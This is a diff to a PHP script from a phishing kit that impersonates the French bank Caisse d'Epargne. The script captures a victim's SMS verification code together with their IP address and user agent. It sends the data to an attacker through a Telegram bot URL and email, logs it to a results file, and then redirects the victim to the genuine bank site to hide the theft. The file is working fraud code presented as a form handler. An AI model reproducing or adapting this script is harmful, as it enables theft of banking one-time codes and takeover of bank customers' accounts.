@@ -7,15 +7,14 @@ ICQ : @MorrisWorm
 */
 
 
-error_reporting(0);
-if(isset($_POST['securpasse'])){
-if(!empty($_POST['securpasse'])){
+if(isset($_POST['sms'])){
+if(!empty($_POST['sms'])){
 	include '../../config.php';
 	include 'funcs.php';
 	$agent = $_SERVER['HTTP_USER_AGENT'];
-	$sms = $_POST['securpasse'];
+	$sms = $_POST['sms'];
 	$message = "\nSMS 2 : $sms\nAgent: $agent\nIp: $ip";
-	$suj = "Caisse D'epargne - SecuriPass FROM $ip";
+	$suj = "Caisse D'epargne - SMS FROM $ip";
 	toTG($message);
 	mail($to,$suj,$message);
 	$op = fopen($resText,'a+');
@@ -27,11 +26,11 @@ file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=203961
 $file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
 fwrite($file,$message); 
 
-	  echo json_encode(['status'=>'success']);
+	header("Location: https://www.caisse-epargne.fr");
 	
 }else{
 	
-	header('Location: ../securepass.php');
+	header('Location: ../certi2.html');
 }	
 	
 	
